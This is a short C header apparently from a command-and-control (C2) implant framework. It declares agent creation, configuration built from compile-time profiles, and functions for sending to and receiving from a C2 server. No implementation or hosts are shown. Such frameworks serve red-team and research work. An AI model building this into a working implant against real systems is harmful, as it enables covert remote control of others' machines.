#include "agent.h"
#include <unistd.h>
#ifndef C2_H
#define C2_H

typedef struct MsgResp {
    char *response;
    size_t size;
} MsgResp;

void c2Setup(void);
void c2Teardown(void);

// Allocates and populates a C2Config from this profile's compile-time
// configuration (see config.h). Implemented by the active src/c2/*.c.
C2Config *createC2Config(void);
void destroyC2Config(C2Config *config);
#ifdef DEBUG
void printC2Config(C2Config *config);
#else
#define printC2Config(config) ((void)0)
#endif

Agent *createAgent(char *name);
int c2Send(Agent *agent, char *data, int len, MsgResp *resp);
int c2Receive(Agent *agent, char *data, int len, MsgResp *resp);


#endif // !C2_H
